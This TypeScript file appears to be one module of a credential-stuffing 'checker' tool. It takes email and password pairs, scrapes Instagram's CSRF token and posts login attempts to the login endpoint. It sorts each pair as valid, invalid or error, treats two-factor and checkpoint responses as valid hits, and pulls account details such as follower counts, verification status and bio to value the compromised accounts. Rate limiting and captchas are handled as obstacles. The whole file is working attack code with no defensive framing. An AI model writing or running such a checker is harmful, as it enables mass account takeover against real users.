import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class InstagramChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Get Instagram login page to extract csrf token
      const loginPageResponse = await this.client.get('https://www.instagram.com/accounts/login/');
      const pageText = loginPageResponse.data;
      
      // Extract csrf token from page
      const csrfMatch = pageText.match(/{"csrf_token":"([^"]+)"/);
      const csrfToken = csrfMatch ? csrfMatch[1] : '';
      
      if (!csrfToken) {
        return this.createResult(
          email,
          password,
          'instagram',
          'error',
          undefined,
          'Failed to get CSRF token'
        );
      }

      // Get additional required headers
      const cookies = loginPageResponse.headers['set-cookie'] || [];
      const cookieString = cookies.map(cookie => cookie.split(';')[0]).join('; ');

      // Instagram login attempt
      const loginResponse = await this.client.post(
        'https://www.instagram.com/accounts/login/ajax/',
        {
          username: email,
          enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
          queryParams: {},
          optIntoOneTap: false,
        },
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': csrfToken,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Cookie': cookieString,
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Origin': 'https://www.instagram.com',
          },
        }
      );

      const data = loginResponse.data;

      if (data?.authenticated) {
        // Get account details
        const capture = await this.getAccountDetails(data.userId, csrfToken, cookieString);
        
        return this.createResult(email, password, 'instagram', 'valid', capture);
      }

      if (data?.two_factor_required) {
        return this.createResult(email, password, 'instagram', 'valid', {
          twoFactorEnabled: true,
          requiresVerification: true,
        });
      }

      if (data?.checkpoint_url) {
        return this.createResult(email, password, 'instagram', 'valid', {
          requiresVerification: true,
          checkpointUrl: data.checkpoint_url,
        });
      }

      // Check for specific error messages
      if (data?.message === 'checkpoint_required') {
        return this.createResult(email, password, 'instagram', 'valid', {
          requiresVerification: true,
        });
      }

      if (data?.errors?.error?.includes('password')) {
        return this.createResult(email, password, 'instagram', 'invalid');
      }

      return this.createResult(email, password, 'instagram', 'invalid');
    } catch (error: any) {
      const status = error.response?.status;
      const responseText = error.response?.data || '';

      // Handle rate limiting
      if (status === 429) {
        return this.createResult(
          email,
          password,
          'instagram',
          'error',
          undefined,
          'Rate limited by Instagram'
        );
      }

      // Handle captcha/security checks
      if (this.detectCaptcha(JSON.stringify(responseText))) {
        return this.createResult(
          email,
          password,
          'instagram',
          'error',
          undefined,
          'Security check required'
        );
      }

      return this.createResult(
        email,
        password,
        'instagram',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(userId: string, csrfToken: string, cookies: string) {
    try {
      const response = await this.client.get(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          headers: {
            'X-CSRFToken': csrfToken,
            'Cookie': cookies,
          },
        }
      );

      const user = response.data?.user;
      
      if (!user) return {};

      return {
        username: user.username,
        displayName: user.full_name,
        followers: user.follower_count,
        following: user.following_count,
        posts: user.media_count,
        verified: user.is_verified,
        isPremium: user.is_business,
        bio: user.biography,
        profilePic: user.profile_pic_url,
        isPrivate: user.is_private,
      };
    } catch {
      return {};
    }
  }
}
